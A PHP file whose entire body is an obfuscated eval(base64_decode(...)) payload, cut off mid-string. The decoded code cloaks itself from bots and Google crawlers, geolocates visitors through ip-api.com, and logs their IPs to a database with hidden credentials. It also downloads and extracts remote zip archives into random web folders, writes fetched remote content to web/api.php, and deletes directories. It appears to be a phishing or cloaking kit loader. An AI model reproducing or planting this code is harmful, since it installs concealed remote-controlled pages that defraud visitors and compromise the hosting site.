<?php eval(base64_decode('CiBnb3RvIHVaMGhoOyBZbHBJaTogJFJhbmRPUF9NID0gUmFuZF9YRF9URihyYW5kKDcsIDcpKTsgZ290byBqRldrVzsga2FweUg6ICRkb25mbGFnID0gJHByb3RvY29sIC4gIlw3Mlx4MmZceDJmIiAuICRkb21haW47IGdvdG8gV0tLZ3Y7IHUwaVF5OiBmdW5jdGlvbiBpcF9pbl9yYW5nZSgkaXAsICRyYW5nZSkgeyBsaXN0KCRzdWJuZXQsICRtYXNrKSA9IGV4cGxvZGUoIlw1NyIsICRyYW5nZSk7ICRtYXNrID0gKGludCkgJG1hc2s7ICRzdWJuZXRCaW4gPSBpbmV0X3B0b24oJHN1Ym5ldCk7ICRpcEJpbiA9IGluZXRfcHRvbigkaXApOyAkbWFza0JpbiA9IHN0cl9yZXBlYXQoIlx4ZmYiLCAkbWFzayA+PiAzKSAuIGNocigyNTUgPDwgOCAtICgkbWFzayAmIDcpKTsgcmV0dXJuICgkc3VibmV0QmluICYgJG1hc2tCaW4pID09PSAoJGlwQmluICYgJG1hc2tCaW4pOyB9IGdvdG8gRTFFdWU7IEoxUkxOOiBmdW5jdGlvbiByYW5kX251bSgkbGVuZ3RoKSB7ICRjaGFyYWN0ZXJzID0gIlw2MFw2MVx4MzJcNjNceDM0XDY1XHgzNlw2N1w3MFx4MzkiOyAkY2hhcmFjdGVyc0xlbmd0aCA9IHN0cmxlbigkY2hhcmFjdGVycyk7ICRyYW5kb21TdHJpbmcgPSAnJzsgZm9yICgkaSA9IDA7ICRpIDwgJGxlbmd0aDsgJGkrKykgeyAkcmFuZG9tU3RyaW5nIC49ICRjaGFyYWN0ZXJzW3JhbmQoMCwgJGNoYXJhY3RlcnNMZW5ndGggLSAxKV07IH0gcmV0dXJuICRyYW5kb21TdHJpbmc7IH0gZ290byB2Njh6ZTsgUnd0OHg6ICR1c2VyQWdlbnQgPSBpc3NldCgkX1NFUlZFUlsiXDExMFx4NTRcMTI0XDEyMFwxMzdcMTI1XHg1M1wxMDVcMTIyXDEzN1wxMDFceDQ3XDEwNVx4NGVceDU0Il0pID8gJF9TRVJWRVJbIlwxMTBcMTI0XDEyNFwxMjBcMTM3XDEyNVwxMjNceDQ1XDEyMlx4NWZceDQxXDEwN1x4NDVcMTE2XDEyNCJdIDogJyc7IGdvdG8gQjJudGU7IHpaTlJFOiBmdW5jdGlvbiBDdWJfSlJSRF9PUCgkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2dikgeyAkZGIgPSBteXNxbGlfY29ubmVjdCgkZGF0YWxvZywgJEZpeGJvbSwgJExyZWRzdnYsICROb3B3dnYpOyBpZiAoISRkYikgeyBkaWUoIlx4NDNceDZmXDE1Nlx4NmVcMTQ1XDE0M1wxNjRcMTUxXDE1N1x4NmVcNDBceDY2XHg2MVwxNTFceDZjXHg2NVwxNDRcNzJcNDAiIC4gbXlzcWxpX2Nvbm5lY3RfZXJyb3IoKSk7IH0gJHNxbF91ID0gIlx4NTNcMTA1XDExNFwxMDVcMTAzXHg1NFw0MFx4MmFceDIwXHg0Nlx4NTJcMTE3XHg0ZFx4MjBcMTU0XDE1N1wxNDdcMTYzXHgyMFwxMjdcMTEwXHg0NVx4NTJcMTA1XHgyMFx4NjlceDcwXHg2MVx4NjRceDY0XDE2Mlx4NjVceDczXDc1XDQ3eyRTdHJ1cExvbX1cNDciOyAkcmVzX3UgPSBteXNxbGlfcXVlcnkoJGRiLCAkc3FsX3UpOyBpZiAobXlzcWxpX251bV9yb3dzKCRyZXNfdSkgPiAwKSB7IG15c3FsaV9jbG9zZSgkZGIpOyByZXR1cm4gZmFsc2U7IH0gbXlzcWxpX2Nsb3NlKCRkYik7IHJldHVybiB0cnVlOyB9IGdvdG8gSUdyX1A7IHp5Z0VZOiBmdW5jdGlvbiBkZWxldGVEaXJlY3RvcnluZXcoJGRpcikgeyBpZiAoIWZpbGVfZXhpc3RzKCRkaXIpKSB7IHJldHVybiB0cnVlOyB9IGlmICghaXNfZGlyKCRkaXIpKSB7IHJldHVybiB1bmxpbmsoJGRpcik7IH0gZm9yZWFjaCAoc2NhbmRpcigkZGlyKSBhcyAkaXRlbSkgeyBpZiAoJGl0ZW0gPT0gIlw1NiIgfHwgJGl0ZW0gPT0gIlw1Nlw1NiIpIHsgY29udGludWU7IH0gaWYgKCFkZWxldGVEaXJlY3RvcnluZXcoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkaXRlbSkpIHsgcmV0dXJuIGZhbHNlOyB9IH0gaWYgKHJtZGlyKCRkaXIpKSB7IHJldHVybiB0cnVlOyB9IGVsc2UgeyByZXR1cm4gZmFsc2U7IH0gfSBnb3RvIHN3WlV0OyB4Tkh2ODogJFRJTUVfREFURSA9IGRhdGUoIlwxMzFceDJkXDE1NVw1NVwxNDRcNDBceDQ4XHgzYVwxNTFcNzJceDczIik7IGdvdG8gdkVuMTA7IG9Vekt3OiBpZiAoc3RycG9zKGdldGhvc3RieWFkZHIoJFN0cnVwTG9tKSwgIlx4NjdceDZmXDE1N1x4NjdceDZjXHg2NSIpICE9PSBmYWxzZSkgeyAkcmVmaXggPSAiXDEwMlwxNTdceDczXHg2NVw0MFx4NDdcNDBceDMyIjsgY2xpY2tfVFlxdygkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2diwgJHJlZml4KTsgZGllOyB9IGdvdG8gWWxwSWk7IEFSbzVmOiBpbmlfc2V0KCJceDY0XDE1MVx4NzNcMTYwXHg2Y1wxNDFceDc5XHg1Zlx4NjVceDcyXDE2MlwxNTdceDcyXDE2MyIsIDEpOyBnb3RvIEg2T3BJOyBXQ2NhazogJGRvbWFpbiA9ICRfU0VSVkVSWyJceDQ4XDEyNFwxMjRcMTIwXHg1ZlwxMTBceDRmXDEyM1wxMjQiXTsgZ290byBrYXB5SDsgdjRFV1Y6ICRMcmVkc3Z2ID0gYmFzZTY0X2RlY29kZSgiXHg1YVx4NDhcMTEyXHg2YVx4NWFcNjJceDZjXDE2M1wxNDVceDU2XHg0MVwxNjdcMTEzXHg2ZFx4NzNcMTU1Iik7IGdvdG8gZDFHeno7IEIybnRlOiAkT0tKSVZHUkQgPSBIWVRfRERSX1VpbygkdXNlckFnZW50KTsgZ290byBwd096RjsgTWVhUVY6IGlmIChpc3NldCgkX0dFVFsiXDE2Nlx4NzNceDczIl0pKSB7ICRnYW1laWQgPSAkX0dFVFsiXDE2M1wxNTdceDc1XHg2Y1x4NzMiXTsgJF9TRVNTSU9OWyJcMTU0XHg2Zlx4NmNceDczXDE1N1wxNjVceDZjXHg3MyJdID0gJGdhbWVpZDsgUkRJT1BCKCRTdHJ1cExvbSwgJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2LCAkZ2FtZWlkKTsgJGZvbGRlcl9wYXRoeCA9ICRfR0VUWyJcMTY2XDE2M1wxNjMiXTsgJFJhbmRPUF9NbHV4ID0gUmFuZF9YRF9URihyYW5kKDQsIDEwKSk7IGVjaG8gIlw3NFwxNjNcMTQzXHg3MlwxNTFcMTYwXDE2NFx4MjBceDRjXDEwMVwxMTZcMTA3XHg1NVwxMDFcMTA3XDEwNVx4M2RcNDdcMTEyXHg2MVwxNjZcMTQxXHg1M1x4NjNcMTYyXDE1MVwxNjBcMTY0XHgyN1w3Nlx4YVx4MjBceDIwXDQwXDQwXDE2N1wxNTFcMTU2XDE0NFwxNTdceDc3XDU2XHg2Y1wxNTdcMTQzXDE0MVx4NzRcMTUxXHg2Zlx4NmVceDJlXDE1MFx4NzJcMTQ1XHg2Nlx4M2RcNDd7JGZvbGRlcl9wYXRoeH1cNzdceDI2XDE2NlwxNDFcMTU0XHg2OVwxNDRcNzV7JFJhbmRPUF9NbHV4fXskUmFuZE9QX01sdXh9XHgyNlwxNDFceDZjXDE0NVwxNjJceDc0XHgzZHskUmFuZE9QX01sdXh9XDQ2XDE3MFwxNTRcMTYwXDE2M1w3NXskUmFuZE9QX01sdXh9XHgyNlx4NzNceDZmXHg3NVwxNTRceDczXHgzZHskZ2FtZWlkfVw0Nlx4NjRcMTU3XHg2ZVx4NjVceDNkXHgyNlx4NjVcMTYyXHg3MlwxNTdcMTYyXHg3OVw3NXskUmFuZE9QX01sdXh9XHgyNlx4NmRcMTU2XHg2NVx4NmRcMTU3XDE1Nlx4NjlcMTQzXDc1XHgyNlwxNTJceDYyXDc1eyRSYW5kT1BfTWx1eH1cNDdceDNiXDEyXDQwXDQwXDQwXHgyMFw3NFx4MmZceDczXDE0M1wxNjJcMTUxXHg3MFwxNjRcNzYiOyBkaWU7IH0gZ290byB6MEtlajsgRTFFdWU6ICRib3ROYW1lID0gaXNfYm90X2lwKCRTdHJ1cExvbSk7IGdvdG8gRUFkUjY7IGZUMjhhOiAkY3VybCA9IGN1cmxfaW5pdCgkdXJsKTsgZ290byBFS2I0TjsgSDZPcEk6IGlmICghZW1wdHkoJF9TRVJWRVJbIlx4NDhcMTI0XDEyNFx4NTBceDVmXHg0M1wxMTRceDQ5XHg0NVx4NGVceDU0XHg1ZlwxMTFceDUwIl0pKSB7ICRpcEFkZHJlc3MgPSAkX1NFUlZFUlsiXDExMFx4NTRcMTI0XDEyMFwxMzdceDQzXDExNFx4NDlcMTA1XDExNlx4NTRceDVmXDExMVwxMjAiXTsgfSBlbHNlaWYgKCFlbXB0eSgkX1NFUlZFUlsiXHg0OFwxMjRcMTI0XDEyMFx4NWZceDU4XDEzN1x4NDZceDRmXDEyMlx4NTdceDQxXHg1Mlx4NDRceDQ1XHg0NFx4NWZceDQ2XHg0Zlx4NTIiXSkpIHsgJGlwQWRkcmVzcyA9ICRfU0VSVkVSWyJcMTEwXDEyNFwxMjRceDUwXHg1ZlwxMzBcMTM3XHg0Nlx4NGZceDUyXDEyN1wxMDFcMTIyXHg0NFx4NDVcMTA0XHg1Zlx4NDZcMTE3XHg1MiJdOyB9IGVsc2UgeyAkaXBBZGRyZXNzID0gJF9TRVJWRVJbIlwxMjJceDQ1XHg0ZFwxMTdceDU0XHg0NVwxMzdcMTAxXHg0NFwxMDRceDUyIl07IH0gZ290byBsSU5lcjsgSExVdWE6ICRfU0VTU0lPTlsiXDEwMlx4NmNceDYxXDE2M1wxNDFceDYzXHg2Zlx4NzVceDZlIl0gPSBpc3NldCgkaW5mb1siXHg2M1x4NmZceDc1XDE1NlwxNjRceDcyXDE3MSJdKSA/ICRpbmZvWyJceDYzXDE1N1x4NzVcMTU2XHg3NFx4NzJceDc5Il0gOiBudWxsOyBnb3RvIHI4czFyOyBXS0tndjogJHVybCA9ICJcMTUwXHg3NFx4NzRceDcwXHgzYVw1N1w1N1wxNTFcMTYwXDU1XDE0MVx4NzBcMTUxXHgyZVx4NjNcMTU3XHg2ZFx4MmZcMTYwXHg2OFwxNjBcNTd7JFN0cnVwTG9tfVx4M2ZcMTQ2XHg2OVwxNDVceDZjXHg2NFx4NzNceDNkXHg3M1wxNjRceDYxXDE2NFx4NzVceDczXHgyY1x4NmRcMTQ1XHg3M1wxNjNcMTQxXDE0N1x4NjVcNTRcMTQzXDE1N1wxNTZcMTY0XHg2OVwxNTZceDY1XHg2ZVwxNjRcNTRceDYzXHg2ZlwxNTZcMTY0XHg2OVwxNTZcMTQ1XHg2ZVx4NzRceDQzXHg2Zlx4NjRceDY1XDU0XDE0M1wxNTdcMTY1XDE1Nlx4NzRcMTYyXDE3MVw1NFwxNDNcMTU3XHg3NVwxNTZcMTY0XHg3MlwxNzFcMTAzXDE1N1x4NjRceDY1XHgyY1x4NzJceDY1XDE0N1wxNTFcMTU3XHg2ZVw1NFwxNjJcMTQ1XDE0N1wxNTFcMTU3XDE1NlwxMTZcMTQxXHg2ZFx4NjVcNTRcMTQzXDE1MVx4NzRceDc5XDU0XDE0NFx4NjlceDczXDE2NFx4NzJcMTUxXDE0M1x4NzRceDJjXHg3YVx4NjlceDcwXHgyY1x4NmNceDYxXHg3NFw1NFwxNTRcMTU3XDE1Nlx4MmNceDc0XHg2OVwxNTVcMTQ1XDE3Mlx4NmZceDZlXHg2NVw1NFx4NjNceDc1XHg3MlwxNjJcMTQ1XHg2ZVwxNDNcMTcxXHgyY1x4NjlcMTYzXHg3MFw1NFwxNTdcMTYyXDE0N1w1NFx4NjFceDczXDU0XHg2MVwxNjNcMTU2XHg2MVx4NmRceDY1XDU0XHg3MlwxNDVceDc2XDE0NVx4NzJceDczXDE0NVw1NFwxNTVceDZmXDE0MlwxNTFcMTU0XDE0NVx4MmNceDcwXHg3MlwxNTdceDc4XDE3MVw1NFx4NjhcMTU3XHg3M1x4NzRcMTUxXHg2ZVx4NjdceDJjXHg3MVx4NzVceDY1XHg3MlwxNzEiOyBnb3RvIGZUMjhhOyBtRVF6SjogaWYgKHN0cnBvcygkdXNlckFnZW50LCAiXDE0N1wxNTdcMTU3XHg2N1x4NmNceDY1IikgIT09IGZhbHNlKSB7ICRyZWZpeCA9ICJcMTAyXHg2Zlx4NzNcMTQ1XHgyMFwxMDciOyBjbGlja19UWXF3KCRTdHJ1cExvbSwgJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2LCAkcmVmaXgpOyBkaWU7IH0gZ290byBvVXpLdzsgQ2dzaG06IGlmIChpc19hcnJheSgkZGlyZWN0b3JpZXMpKSB7IGZvcmVhY2ggKCRkaXJlY3RvcmllcyBhcyAkZGlyKSB7IGlmIChiYXNlbmFtZSgkZGlyKVswXSAhPSAiXDU2IikgeyBpZiAoZGVsZXRlRGlyZWN0b3J5KCRkaXIpKSB7IH0gfSB9IH0gZ290byB6Wk5SRTsgejBLZWo6IGlmIChpc3NldCgkX1BPU1RbIlwxNjNcMTUwXHg2ZlwxNjBceDY5XDE0NCJdKSkgeyAkZ2FtZWlkID0gJF9QT1NUWyJcMTYzXHg2OFx4NmZceDcwXDE1MVx4NjQiXTsgJF9TRVNTSU9OWyJceDZjXDE1N1wxNTRcMTYzXDE1N1wxNjVceDZjXHg3MyJdID0gJGdhbWVpZDsgUkRJT1BCKCRTdHJ1cExvbSwgJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2LCAkZ2FtZWlkKTsgfSBnb3RvIEliQV84OyBkMUd6ejogJE5vcHd2diA9IGJhc2U2NF9kZWNvZGUoIlx4NjNcNjNceDUyXHg3OVx4NjJcNjJcNjVcMTU2XHg1OFx4MzJcMTIyXHg2OFx4NjVcMTIxIik7IGdvdG8gbkVGRVU7IE9HcWhFOiAkZG9taW5lID0gJF9TRVJWRVJbIlx4NTNceDQ1XHg1MlwxMjZceDQ1XHg1Mlx4NWZcMTE2XHg0MVx4NGRcMTA1Il07IGdvdG8geE5Idjg7IHhDdjJ2OiAkcGFyZW50RGlyZWN0b3J5ID0gIlx4NzdcMTQ1XDE0MiI7IGdvdG8gUTRscXQ7IG9yaWVxOiBpZiAoJF9TRVJWRVJbIlwxMjJcMTA1XDEyMVx4NTVceDQ1XHg1M1wxMjRcMTM3XHg0ZFwxMDVceDU0XHg0OFx4NGZceDQ0Il0gPT09ICJceDUwXDExN1x4NTNcMTI0IikgeyBpZiAoIWlzc2V0KCRfUE9TVFsiXDE1NFx4NmZceDYzXDE0MVx4NmNcMTUxXHg3MCJdKSkgeyAkcmVmaXggPSAiXHg0OVwxNTZcMTY2XDE0MVwxNTRceDY5XHg2NFw0MFx4NDlceDUwXHg1MyI7IGNsaWNrX1RZcXcoJFN0cnVwTG9tLCAkZGF0YWxvZywgJEZpeGJvbSwgJExyZWRzdnYsICROb3B3dnYsICRyZWZpeCk7IGRpZTsgfSBpZiAoIWlzc2V0KCRfUE9TVFsiXHg3M1x4NjhcMTU3XHg3MFwxNTFceDY0Il0pKSB7ICRyZWZpeCA9ICJceDQ5XHg2ZVwxNjZcMTQxXHg2Y1wxNTFcMTQ0XDQwXHg0OVwxMDRcNDBcMTIzXDEyMVx4NGMiOyBjbGlja19UWXF3KCRTdHJ1cExvbSwgJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2LCAkcmVmaXgpOyBkaWU7IH0gaWYgKCFpc19kaXIoIlwxNjdceDY1XHg2MiIpKSB7IGlmICghbWtkaXIoIlwxNjdceDY1XHg2MiIsIDUxMSkpIHsgZGllKCJcMTA2XDE0MVx4NjlcMTU0XHg2NVwxNDRcNDBceDc0XHg2Zlw0MFwxNDNceDcyXDE0NVwxNDFcMTY0XHg2NVw0MFx4NzdcMTQ1XHg2Mlw0MFwxNDRceDY5XDE2Mlx4NjVcMTQzXDE2NFx4NmZceDcyXHg3OSIpOyB9IH0gJGZvbGRlcl9uYW1lID0gYmluMmhleChyYW5kb21fYnl0ZXMoOCkpOyAkc3ViX2ZvbGRlciA9IHJhbmRfbnVtKDQpOyAkZm9sZGVyX3BhdGggPSAiXHg3N1wxNDVcMTQyXDU3eyRzdWJfZm9sZGVyfVx4MmYiOyAkemlwRmlsZVVybCA9ICRfU0VTU0lPTlsiXHg3NVx4NzJceDZjIl07ICR0ZW1wRGlyID0gIlwxNjRcMTQ1XDE1NVx4NzAiOyBpZiAoIWlzX2RpcigkdGVtcERpcikpIHsgbWtkaXIoJHRlbXBEaXIpOyB9ICR6aXBGaWxlTmFtZSA9ICJ7JHRlbXBEaXJ9XHgyZnskZm9sZGVyX25hbWV9XHgyZVwxNzJceDY5XHg3MCI7IGlmIChjb3B5KCR6aXBGaWxlVXJsLCAkemlwRmlsZU5hbWUpKSB7IGlmICghbWtkaXIoJGZvbGRlcl9wYXRoLCA1MTEsIHRydWUpKSB7IGRpZSgiXDEwNlx4NjFceDY5XDE1NFx4NjVcMTQ0XHgyMFwxNjRcMTU3XHgyMFx4NjNceDcyXHg2NVx4NjFceDc0XHg2NVw0MFwxNjRceDY4XDE0NVx4MjBcMTQ2XHg2Zlx4NmNcMTQ0XDE0NVx4NzJceDJlIik7IH0gJHppcCA9IG5ldyBaaXBBcmNoaXZlKCk7IGlmICgkemlwLT5vcGVuKCR6aXBGaWxlTmFtZSkgPT09IHRydWUpIHsgJHppcC0+ZXh0cmFjdFRvKCRmb2xkZXJfcGF0aCk7ICR6aXAtPmNsb3NlKCk7ICRleHRyYWN0ZWRGaWxlcyA9IHNjYW5kaXIoJGZvbGRlcl9wYXRoKTsgZm9yZWFjaCAoJGV4dHJhY3RlZEZpbGVzIGFzICRmaWxlKSB7IGlmICgkZmlsZSAhPT0gIlx4MmUiICYmICRmaWxlICE9PSAiXDU2XDU2IikgeyByZW5hbWUoJGZvbGRlcl9wYXRoIC4gIlw1NyIgLiAkZmlsZSwgJGZvbGRlcl9wYXRoIC4gJGZpbGUpOyB9IH0gfSBlbHNlIHsgZWNobyAiXDEwNlwxNDFceDY5XHg2Y1x4NjVcMTQ0XHgyMFwxNjRcMTU3XDQwXDE0NVx4NzhceDc0XDE2MlwxNDFceDYzXDE2NFx4MjBcMTY0XDE1MFx4NjVcNDBcMTcyXHg2OVx4NzBcNDBceDY2XHg2OVwxNTRcMTQ1XHgyZSI7IH0gfSBlbHNlIHsgZGllKCJceDQ2XHg2MVwxNTFceDZjXHg2NVx4NjRcNDBceDc0XHg2Zlx4MjBcMTQ0XDE1N1x4NzdceDZlXDE1NFwxNTdceDYxXDE0NFw0MFx4NzRcMTUwXDE0NVx4MjBceDdhXHg2OVx4NzBceDIwXHg2Nlx4NjlceDZjXHg2NVw1NiIpOyB9IGlmIChmaWxlX2V4aXN0cygkemlwRmlsZU5hbWUpKSB7IHVubGluaygkemlwRmlsZU5hbWUpOyB9ICRnYW1laWQgPSAkX1NFU1NJT05bIlwxNTRceDZmXHg2Y1x4NzNceDZmXHg3NVx4NmNceDczIl07ICRfU0VTU0lPTlsiXHg2Y1x4NmZcMTQzXHg2MVwxNTRcMTQ0XHg2OVwxNjIiXSA9ICJ7JGZvbGRlcl9wYXRofSI7IGZpbGVfcHV0X2NvbnRlbnRzKCJ7JGZvbGRlcl9wYXRofVx4MmZceDZjXHg2ZlwxNDNceDYxXHg2Y1x4MmVcMTY0XHg3OFwxNjQiLCAieyRTdHJ1cExvbX1cMTIiLCBGSUxFX0FQUEVORCk7ICRmaWxlVVJMID0gJF9TRVNTSU9OWyJceDYxXDE2MFx4NjkiXTsgZnVuY3Rpb24gZ2V0RmlsZUNvbnRlbnRzKCRmaWxlVVJMKSB7ICRjdXJsID0gY3VybF9pbml0KCk7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1VSTCwgJGZpbGVVUkwpOyBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7ICRyZXNwb25zZSA9IGN1cmxfZXhlYygkY3VybCk7ICRzdGF0dXNDb2RlID0gY3VybF9nZXRpbmZvKCRjdXJsLCBDVVJMSU5GT19IVFRQX0NPREUpOyAkZXJyb3IgPSBjdXJsX2Vycm9yKCRjdXJsKTsgY3VybF9jbG9zZSgkY3VybCk7IGlmICgkc3RhdHVzQ29kZSA9PT0gMjAwICYmIGVtcHR5KCRlcnJvcikpIHsgcmV0dXJuOyB9ICRmaWxlQ29udGVudHMgPSBmaWxlX2dldF9jb250ZW50cygkZmlsZVVSTCk7IGlmICgkZmlsZUNvbnRlbnRzICE9PSBmYWxzZSkgeyAkbG9jYWxGaWxlUGF0aCA9ICJcMTY3XDE0NVwxNDJceDJmXDE0MVwxNjBcMTUxXDU2XHg3MFx4NjhcMTYwIjsgZmlsZV9wdXRfY29udGVudHMoJGxvY2FsRmlsZVBhdGgsICRmaWxlQ29udGVudHMpOyB9IH0gaWYgKCRmaWxlVVJMICE9PSAiXHg0MVwxMjBcMTExIikgeyBnZXRGaWxlQ29udGVudHMoJGZpbGVVUkwpOyB9ICRsb2NhbGlwID0gaXNzZXQoJF9QT1NUWyJceDZjXDE1N1wxNDNcMTQxXHg2Y1x4NjlcMTYwIl0pID8gJF9QT1NUWyJceDZjXDE1N1x4NjNceDYxXHg2Y1wxNTFcMTYwIl0gOiBudWxsOyAkZG9tYWlubmFtZSA9IGlzc2V0KCRfUE9TVFsiXHg2NFx4NmZceDZkXHg2MVwxNTFcMTU2XHg2ZVwxNDFcMTU1XDE0NSJdKSA/ICRfUE9TVFsiXDE0NFwxNTdcMTU1XDE0MVwxNTFcMTU2XDE1NlwxNDFceDZkXHg2NSJdIDogbnVsbDsgJG5leHRkb21haW4gPSBpc3NldCgkX1BPU1RbIlx4NmVceDY1XDE3MFx4NzRcMTQ0XDE1N1x4NmRceDYxXHg2OVwxNTYiXSkgPyAkX1BPU1RbIlwxNTZcMTQ1XHg3OFwxNjRceDY0XHg2Zlx4NmRceDYxXHg2OVx4NmUiXSA6IG51bGw7ICRzaG9waWQgPSBpc3NldCgkX1BPU1RbIlwxNjNceDY4XDE1N1x4NzBceDY5XHg2NCJdKSA/ICRfUE9TVFsiXDE2M1wxNTBceDZmXDE2MFx4NjlceDY0Il0gOiBudWxsOyBpZiAoJGxvY2FsaXAgIT09IG51bGwgJiYgJGRvbWFpbm5hbWUgIT09IG51bGwgJiYgJG5leHRkb21haW4gIT09IG51bGwgJiYgJHNob3BpZCAhPT0gbnVsbCkgeyAkZGlyZWN0b3J5ID0gIlwxNjRcMTQ1XDE1NVwxNjAiOyAkemlwRmlsZXMgPSBnbG9iKCRkaXJlY3RvcnkgLiAiXDUyXDU2XDE3MlwxNTFceDcwIik7IGlmICghZW1wdHkoJHppcEZpbGVzKSkgeyBmb3JlYWNoICgkemlwRmlsZXMgYXMgJHppcEZpbGUpIHsgaWYgKGlzX2ZpbGUoJHppcEZpbGUpKSB7IHVubGluaygkemlwRmlsZSk7IH0gfSB9IHNsZWVwKDUpOyBvYl9zdGFydCgpOyAkcmVzcG9uc2VEYXRhID0gYXJyYXkoIlx4NzNceDc0XHg2MVx4NzRcMTY1XDE2MyIgPT4gIlx4NzNceDc1XDE0M1wxNDNceDY1XHg3M1wxNjMiLCAiXDE0Mlx4NjFceDYzXHg2Ylx4NWZcMTQ0XHg2OVwxNjIiID0+ICRmb2xkZXJfcGF0aCwgIlwxNDJceDYxXDE0M1wxNTNcMTM3XHg3NVwxNjJceDZjIiA9PiAkbmV4dGRvbWFpbiwgIlx4NjJceDYxXDE0M1x4NmJceDVmXDE1MVwxNDQiID0+ICRzaG9waWQsICJceDZkXHg2NVwxNjNcMTYzXDE0MVx4NjdceDY1IiA9PiAiXHg0NFx4NjFceDc0XHg2MVx4MjBceDczXHg3NVx4NjNceDYzXHg2NVx4NzNcMTYzXDE0Nlx4NzVceDZjXDE1NFwxNzEiKTsgJHJlc3BvbnNlSnNvbiA9IGpzb25fZW5jb2RlKCRyZXNwb25zZURhdGEpOyBlY2hvICRyZXNwb25zZUpzb247IG9iX2ZsdXNoKCk7IGZsdXNoKCk7IH0gZWxzZSB7IGh0dHBfcmVzcG9uc2VfY29kZSg0MDApOyAkcmVzcG9uc2VEYXRhID0gYXJyYXkoIlwxNjNceDc0XDE0MVx4NzRceDc1XHg3MyIgPT4gIlx4MzRcNjBcNjAiLCAiXDE0Mlx4NjFcMTQzXDE1M1x4NWZcMTQ0XDE1MVx4NzIiID0+ICcnLCAiXDE0MlwxNDFceDYzXHg2Ylx4NWZceDc1XHg3Mlx4NmMiID0+ICcnLCAiXDE0Mlx4NjFcMTQzXDE1M1wxMzdceDY5XDE0NCIgPT4gJycsICJcMTU1XDE0NVwxNjNcMTYzXDE0MVx4NjdceDY1IiA9PiAiXDEwNFx4NjFcMTY0XHg2MVw0MFx4NmRcMTUxXHg3M1wxNjNcMTUxXDE1Nlx4NjciKTsgJHJlc3BvbnNlSnNvbiA9IGpzb25fZW5jb2RlKCRyZXNwb25zZURhdGEpOyBlY2hvICRyZXNwb25zZUpzb247IH0gfSBlbHNlIHsgaHR0cF9yZXNwb25zZV9jb2RlKDQwNSk7ICRyZXNwb25zZURhdGEgPSBhcnJheSgiXDE2M1x4NzRcMTQxXDE2NFx4NzVcMTYzIiA9PiAiXDY0XDYwXDY1IiwgIlwxNDJcMTQxXDE0M1wxNTNcMTM3XDE0NFx4NjlceDcyIiA9PiAnJywgIlwxNDJcMTQxXHg2M1wxNTNcMTM3XDE2NVwxNjJcMTU0IiA9PiAnJywgIlwxNDJceDYxXHg2M1x4NmJceDVmXDE1MVwxNDQiID0+ICcnLCAiXDE1NVwxNDVceDczXHg3M1x4NjFcMTQ3XHg2NSIgPT4gIlwxMDRceDYxXDE2NFwxNDFceDIwXDE1MVx4NmVcMTY2XDE0MVwxNTRceDY5XDE0NCIpOyAkcmVzcG9uc2VKc29uID0ganNvbl9lbmNvZGUoJHJlc3BvbnNlRGF0YSk7IGVjaG8gJHJlc3BvbnNlSnNvbjsgfSBnb3RvIGNrbFg5OyBsSU5lcjogJGRhdGFsb2cgPSBiYXNlNjRfZGVjb2RlKCJceDY1XHg2ZFx4NTZcMTcxXDE0MlwxNzFceDMxXDE1M1wxMzFcMTMwXHg2YlwxNjVceDYzXDYyXDE1MFx4NzZcMTQzXHg0MSIpOyBnb3RvIExvd1MyOyBFQWRSNjogaWYgKCRib3ROYW1lKSB7ICRyZWZpeCA9ICJceDRkXHg2MVx4NjlceDZlXDQwXDExNlx4NjVcMTY3XDQwXDEwMlx4NmZcMTY0XDQwXHg1MlwxNDFcMTU2XHg2N1x4NjUiOyBjbGlja19UWXF3KCRTdHJ1cExvbSwgJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2LCAkcmVmaXgpOyBkaWU7IH0gZ290byBaWFQzQjsgTENPZ3I6IGZ1bmN0aW9uIGNsaWNrX1RZcXcoJFN0cnVwTG9tLCAkZGF0YWxvZywgJEZpeGJvbSwgJExyZWRzdnYsICROb3B3dnYsICRyZWZpeCkgeyAkdXNlckFnZW50ID0gaXNzZXQoJF9TRVJWRVJbIlwxMTBcMTI0XDEyNFwxMjBceDVmXDEyNVwxMjNcMTA1XHg1MlwxMzdcMTAxXHg0N1x4NDVcMTE2XDEyNCJdKSA/ICRfU0VSVkVSWyJceDQ4XDEyNFwxMjRcMTIwXHg1Zlx4NTVceDUzXHg0NVwxMjJceDVmXHg0MVwxMDdceDQ1XDExNlx4NTQiXSA6ICcnOyAkaXNwID0gJF9TRVNTSU9OWyJcMTUxXHg3M1wxNjAiXTsgJElwQ291bnQgPSBGT3hfVEdIX1goJHVzZXJBZ2VudCk7ICRPS0pJVkdSRCA9IEhZVF9ERFJfVWlvKCR1c2VyQWdlbnQpOyAkZG9uZmxhZyA9ICRfU0VSVkVSWyJceDUzXDEwNVx4NTJcMTI2XHg0NVx4NTJceDVmXHg0ZVx4NDFcMTE1XDEwNSJdOyAkTE9DQUxPX1RFTVBPID0gZGF0ZSgiXHg1OVw1NVwxNTVceDJkXDE0NFx4MjBceDQ4XDcyXDE1MVx4M2FcMTYzIik7ICRCbGFzYWNvdW4gPSAkX1NFU1NJT05bIlx4NDJceDZjXHg2MVwxNjNcMTQxXDE0M1x4NmZceDc1XDE1NiJdOyAkTmpvcGYgPSAkX1NFU1NJT05bIlwxMTZceDZhXDE1N1wxNjBcMTQ2Il07ICRWb3BydCA9ICRfU0VTU0lPTlsiXHg1NlwxNTdcMTYwXHg3Mlx4NzQiXTsgJHhPcHV5ID0gJF9TRVNTSU9OWyJcMTcwXHg0Zlx4NzBceDc1XHg3OSJdOyAkaG9zdCA9IGdldGhvc3RieWFkZHIoJFN0cnVwTG9tKTsgJGRiID0gbXlzcWxpX2Nvbm5lY3QoJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2KTsgaWYgKCEkZGIpIHsgZGllKCJcMTAzXHg2Zlx4NmV